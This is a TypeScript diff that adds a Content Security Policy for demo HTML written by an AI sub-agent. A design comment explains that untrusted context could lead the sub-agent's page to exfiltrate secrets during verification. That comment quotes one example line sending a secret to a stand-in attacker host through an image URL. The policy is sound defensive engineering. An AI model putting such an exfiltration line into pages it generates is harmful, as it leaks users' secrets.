@@ -213,6 +213,75 @@ export interface DemoResult {
 	notes?: string;
 }
 
+/**
+ * THE DEMO DOCUMENT POLICY (2026-10-28). A demo's HTML is written by a
+ * sub-agent whose brief is free text chosen upstream, on a context that
+ * holds untrusted material — so the document is model output, not trusted
+ * code, and it runs twice: in the app's own Chromium during run_demo
+ * verification, and in the learner's window afterwards. Both need the same
+ * policy, so it lives in the contract rather than in either renderer.
+ *
+ * What it keeps: inline script and style (the model writes inline JS; the
+ * bridge script is injected inline) and library imports from the three
+ * pinned CDNs, which the builder's own instructions promise.
+ *
+ * What it closes: the egress a demo never needed. `connect-src 'none'`
+ * stops fetch/XHR/WebSocket/sendBeacon, and `img-src data: blob:` stops the
+ * `new Image().src = "https://attacker/?k=" + secret` variant — together
+ * the channel that turned "verify the demo" into "exfiltrate during
+ * verification". Residual, accepted: a pinned CDN host still sees a crafted
+ * query string, whose logs an attacker cannot read.
+ */
+export const DEMO_CDN_ORIGINS = [
+	"https://cdnjs.cloudflare.com",
+	"https://cdn.jsdelivr.net",
+	"https://unpkg.com",
+] as const;
+
+export const DEMO_CSP = [
+	"default-src 'none'",
+	`script-src 'unsafe-inline' ${DEMO_CDN_ORIGINS.join(" ")}`,
+	`style-src 'unsafe-inline' ${DEMO_CDN_ORIGINS.join(" ")}`,
+	"img-src data: blob:",
+	"font-src data:",
+	"media-src data: blob:",
+	"connect-src 'none'",
+	"object-src 'none'",
+	"frame-src 'none'",
+	"base-uri 'none'",
+	"form-action 'none'",
+].join("; ");
+
+const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${DEMO_CSP}">`;
+
+/**
+ * Put the policy in front of the document's own content — a meta CSP governs
+ * only what follows it, and it must land AFTER any doctype or the document
+ * would render in quirks mode. Idempotent: a document that already carries
+ * the meta is returned unchanged, so wrapping twice (verification, then
+ * render) cannot stack duplicates.
+ */
+export function withDemoCSP(html: string): string {
+	if (/http-equiv=["']?Content-Security-Policy/i.test(html)) return html;
+	const afterHead = html.match(/<head\b[^>]*>/i);
+	if (afterHead?.index !== undefined) {
+		const at = afterHead.index + afterHead[0].length;
+		return html.slice(0, at) + CSP_META + html.slice(at);
+	}
+	const afterHtml = html.match(/<html\b[^>]*>/i);
+	if (afterHtml?.index !== undefined) {
+		const at = afterHtml.index + afterHtml[0].length;
+		return `${html.slice(0, at)}<head>${CSP_META}</head>${html.slice(at)}`;
+	}
+	const afterDoctype = html.match(/<!doctype[^>]*>/i);
+	if (afterDoctype?.index !== undefined) {
+		const at = afterDoctype.index + afterDoctype[0].length;
+		return html.slice(0, at) + CSP_META + html.slice(at);
+	}
+	// A bare fragment: no doctype to preserve, so the meta leads.
+	return CSP_META + html;
+}
+
 export interface VisualToolInput {
 	/** Precise brief for ONE visual (what it must show, exactly). */
 	brief: string;
